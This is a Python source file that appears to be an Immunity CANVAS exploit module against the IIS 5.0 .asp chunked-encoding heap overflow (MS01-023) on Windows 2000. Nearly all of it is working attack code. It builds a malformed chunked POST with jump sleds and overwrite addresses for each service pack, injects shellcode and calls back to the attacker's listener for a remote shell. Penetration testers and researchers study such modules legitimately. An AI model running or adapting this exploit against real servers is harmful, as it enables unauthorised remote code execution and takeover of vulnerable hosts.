#! /usr/bin/env python


#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

#Immunity CANVAS IIS 5.0 .ASP Chunked Exploit Module

#http://www.immunityinc.com/CANVAS/
#Questions, comments: dave@immunityinc.com
#

#This exploit was tested against Windows 2000, SP 2 English, default
#install. It may require being run several times.

##
#W2Ksp0
#7800f5b1 appears to call 749f68c4 we could change that.
#W2Ksp2
#everyone uses the same exception 0x77ebf44c trick and jumps into the heap
#doesn't work for me!
#77f82680 looks good
#actually 77f82684
#what is 77fcf522?
#actually it is at 77edf44c (just disassm kernel32.SetUnhandledExceptionFilter)
#need to rewrite this to do IIS 5.1 as well and use the oded method

import os,getopt
import sys
sys.path.append(".")
sys.path.append("../../")
sys.path.append('../../encoder')
sys.path.append('./encoder')
sys.path.append("../../shellcode")
sys.path.append("./shellcode")
sys.path.append("../../gui")
sys.path.append("./gui")


import socket
from exploitutils import *
sys.path.append('encoder')
import chunkedaddencoder
sys.path.append("shellcode")
import win32shell
import time
from canvasexploit import canvasexploit
from tcpexploit import tcpexploit
import canvasengine
import addencoder

DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION["Date public"]="05/01/2001"
DOCUMENTATION["CERT Advisory"]="http://www.kb.cert.org/vuls/id/516648"
DOCUMENTATION["CVE Name"] = "CVE-2001-0241"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-0241"
DOCUMENTATION['CVSS'] = 10.0
DOCUMENTATION["References"]="http://www.eeye.com/html/Research/Advisories/AD20010501.html http://www.microsoft.com/technet/security/bulletin/MS01-023.asp"
DOCUMENTATION["MSRC"]="http://www.microsoft.com/technet/security/bulletin/ms01-023.mspx"

NAME="iis5asp (MS01-023)"
DESCRIPTION="IIS 5.0 .asp Heap Overflow"

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2000" ]
PROPERTY['MSADV']="MS01-023"


GTK2_DIALOG="dialog.glade2"


runAnExploit_gtk2=canvasengine.runAnExploit_gtk2
runExploit=canvasengine.runExploit

class theexploit(tcpexploit):
    def __init__(self):
        canvasexploit.__init__(self)
        
        self.port=80
        self.host=""
        self.ssl=0
        self.isiis50=0
        self.size=60000
        self.attackfile="/iisstart.asp"
        self.InitString+="fixheap "
        self.eax=0
        self.ecx=0
        self.setVersions()
        self.name=NAME
        self.badstring=",\x20:\x00\x0a\x0d"
        self.subesp=0
        return

    def setAttackfile(self,attackfile):
        self.attackfile=attackfile
        return

    def setPort(self,port):
        self.port=port
        return

    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]
        
    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])

    def setVersions(self):
        self.versions={}
        # we need to jump to a jmp/call [esp + 8]
        # actually, it's a lot easier to just jump to a pop pop return
        # we find this at 77f83373
        #for SP0 the place to comment out is at 77eba030 to get it to work under olly
        #name, [(where, what, loc)]
        self.versions[1]=("Windows 2000 SP0,2 English",
                          [(0x011635DD,0x77edf44c,16), #SP2 value
                           (0x020edf0d,0x77ee044c,16648), #SP0 value2
                           (0x0206c821,0x77ee044c,14512)]) #SP0 value
        self.versions[2]=("Windows 2000 SP0 English", [(0x0115ec69,0x77ee044c,16)])

    def run(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        self.ssl=int(self.argsDict.get("ssl",self.ssl))

        self.setInfo("%s attacking %s:%d (in progress)"%(NAME,self.host,self.port))
        if self.version==0:
            self.log("Version==0, assuming you want default version")
            self.version=1
            
        #wakeup asp
        #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s=self.gettcpsock()
        try:
            s.connect((self.host, self.port))
        except:
            self.log("Connection refused!")
            self.setInfo("%s attacking %s:%d (in failed)"%(NAME,self.host,self.port))
            return 0
        sploitstring="GET /bob.asp HTTP/1.0\r\n\r\n"
        self.log("Waking up asp dllhost.")
        self.websend(s,sploitstring)
        time.sleep(3)
        s.close()
        
        #now make socket connection to target port
        #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s=self.gettcpsock()
        try:
            s.connect((self.host, self.port))
        except:
            self.log("Connection refused!")
            self.setInfo("%s attacking %s:%d (in failed)"%(NAME,self.host,self.port))
            return 0
        sploitstring=self.makesploit()

        self.log("Size of sploitstring is %d" % (len(sploitstring)))
        if self.ssl:
            self.sslsock=socket.ssl(s)
            self.sslsock.write(sploitstring)
            result = self.sslsock.recv(1000)
            self.log("result="+prettyprint(result))
            result = self.sslsock.recv(1000)
            self.log("result="+prettyprint(result))

        else:
            s.send(sploitstring)
            try:
                result = s.recv(1000)
            except:
                result=""
            self.log("result="+(result))
            try:
                result = s.recv(1000)
            except:
                result=""
            self.log("result="+(result))

        s.close()
        self.log("IIS ASP CHUNKED EXPLOIT ATTEMPT FINISHED")
        time.sleep(1)
        if self.ISucceeded():
            self.setInfo("%s attacking %s:%d (succeeded!)"%(NAME,self.host,self.port))
            return 1
        else:
            self.setInfo("%s attacking %s:%d (failed - wrong version: %s)"%(NAME,self.host,self.port,self.versions[self.version][0]))
            return 0


    def setupattack(self):
        #eb16 is harmless at any alignment
        jmpopcode="\xeb\x16"
        attack=""
        attack+="A"*24
        #backwards compared to 5.1 (XP)
        attack+=jmpopcode*(self.size/2)
        for triad in self.versions[self.version][1]:
            what,where,loc=triad
            self.log("Setting what: %8.8x where: %8.8x at: %d"%triad) 
            attack=stroverwrite(attack,intel_order(what)+intel_order(where),loc)
        
        overwritearray=[600,1600,2600,3600,4600,5600,7600,10600,20600,30600,40600,50600,55600,57600,58600]
        for value in overwritearray:
            if value>self.size:
                break
            #we need A*20 for the eb14
            attack=stroverwrite(attack,"A"*0x16+self.shellcode,value)

        return attack


    
    #returns the sploitstring
    def makesploit(self):
        header=""
        body=""

        attack=self.setupattack()
        
        body+=attack
        
        header+="POST "+self.attackfile+"?"+"A"*60000+" HTTP/1.1\r\n"
        header+="Host: "+self.host+"\r\n"
        header+="User-Agent: Mozilla/4.0 (compatible; MSIE 5.0; Windows NT;)\r\n"
        header+="Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,video/x-mng,image/png,image/jpeg,image/gif;q=0.2,text/css,*/*;q=0.1\r\n"
        header+="Connection: keep-alive\r\n"
        header+="Content-Type: application/x-www-form-urlencoded\r\n"
        header+="Transfer-Encoding: chunked\r\n"
        header+="\r\n"
        header+="%8.8x\r\n" % len(body)

        footer="\r\n0\r\n"
        
        return header+body+footer

    def createShellcode(self):
        localhost=self.callback.ip
        localport=self.callback.port
        self.createWin32Shellcode(self.badstring,localhost,localport)
        #set up the shellcode
        self.log("Sizeof shellcode is %d"%len(self.shellcode))
        return 1
    
    def usage(self):
        print "Usage: iis5asp.py -t target -p port [ -s ] -l localip -d localport [-v version]"
        print "-s indicates SSL"
        app=theexploit()
        app.displayVersions()
        
    
#this stuff happens.
if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
 
 
    
